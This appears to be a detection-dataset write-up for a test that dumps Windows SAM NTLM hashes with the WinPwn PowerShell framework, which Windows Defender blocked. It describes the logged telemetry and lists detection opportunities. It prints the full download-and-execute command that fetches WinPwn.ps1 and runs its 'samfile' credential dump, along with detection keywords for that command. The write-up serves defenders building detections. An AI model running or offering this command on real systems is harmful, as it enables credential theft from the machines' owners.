# T1003.002-7: Security Account Manager — WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes

## Technique Context

T1003.002 targets the Security Account Manager (SAM) database, which stores local user account credentials as NTLM hashes on Windows systems. Attackers commonly target the SAM to extract password hashes for offline cracking or pass-the-hash attacks. This specific test uses the WinPwn framework's "samfile" function to dump SAM contents, representing a typical post-exploitation credential harvesting scenario.

The detection community focuses on identifying access to protected registry locations (`HKLM\SAM`, `HKLM\SECURITY`, `HKLM\SYSTEM`), unusual process interactions with LSASS, file system access to SAM-related files, and suspicious PowerShell activities that involve credential dumping tools. WinPwn is a well-known offensive PowerShell framework, making its detection patterns particularly relevant for enterprise defense.

## What This Dataset Contains

This dataset demonstrates a failed SAM dumping attempt due to Windows Defender intervention. The Security event logs show the core process chain: an initial PowerShell process (PID 6496) spawns another PowerShell instance (PID 3172), which then creates the target PowerShell process (PID 3440) with the malicious command line:

```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive}
```

The PowerShell logs capture the download attempt via `New-Object net.webclient` and the subsequent Windows Defender block (EID 4100): "This script contains malicious content and has been blocked by your antivirus software." Sysmon provides rich telemetry including process creation (EID 1), process access events (EID 10) showing cross-process access patterns, DNS queries to `raw.githubusercontent.com` (EID 22), and extensive DLL loading events (EID 7) as PowerShell initializes.

Security EID 4703 shows privilege token adjustments including `SeBackupPrivilege` and `SeSecurityPrivilege` - privileges commonly required for SAM access.

## What This Dataset Does Not Contain

Since Windows Defender successfully blocked the WinPwn script execution, the dataset lacks evidence of actual SAM access attempts. There are no registry access events, no file operations on SAM-related files (`C:\Windows\System32\config\SAM`), no LSASS process access for credential dumping, and no successful credential extraction artifacts. The malicious payload was neutralized before it could perform its intended SAM dumping functionality.

The Sysmon configuration's include-mode filtering means some legitimate processes in the execution chain may not appear in ProcessCreate events, though the critical malicious PowerShell processes are captured due to their suspicious command-line patterns.

## Assessment

This dataset provides excellent telemetry for detecting SAM dumping attempts, even when blocked by endpoint protection. The combination of Security 4688 events with full command-line logging, Sysmon process creation and access events, and PowerShell script block logging creates multiple detection opportunities. The privilege escalation events (4703) and the clear malicious indicators in the command line make this highly valuable for building robust detections.

The Windows Defender block demonstrates how modern endpoint protection interacts with attack techniques, providing defenders with attempt telemetry even when attacks fail. This is particularly valuable as it shows the complete attack chain up to the point of intervention.

## Detection Opportunities Present in This Data

1. **Malicious PowerShell Command Line Detection** - Security EID 4688 containing "iex(new-object net.webclient).downloadstring" combined with GitHub raw URLs and credential dumping keywords like "samfile"

2. **WinPwn Framework Indicators** - Process command lines containing references to "S3cur3Th1sSh1t/WinPwn" GitHub repository URLs

3. **Suspicious Privilege Token Adjustments** - Security EID 4703 showing PowerShell processes enabling SeBackupPrivilege and SeSecurityPrivilege simultaneously

4. **Cross-Process Access from PowerShell** - Sysmon EID 10 showing PowerShell processes accessing other processes with high-privilege access rights (0x1FFFFF)

5. **Malicious Script Download Attempts** - DNS queries (EID 22) to raw.githubusercontent.com followed by PowerShell network object creation

6. **AMSI/Defender Script Blocks** - PowerShell EID 4100 error messages indicating "script contains malicious content and has been blocked"

7. **Nested PowerShell Process Chains** - Process creation patterns showing PowerShell spawning additional PowerShell instances with suspicious parameters

8. **PowerShell Web Client Object Creation** - PowerShell module logging (EID 4103) showing New-Object cmdlet with net.webclient parameter for remote script execution
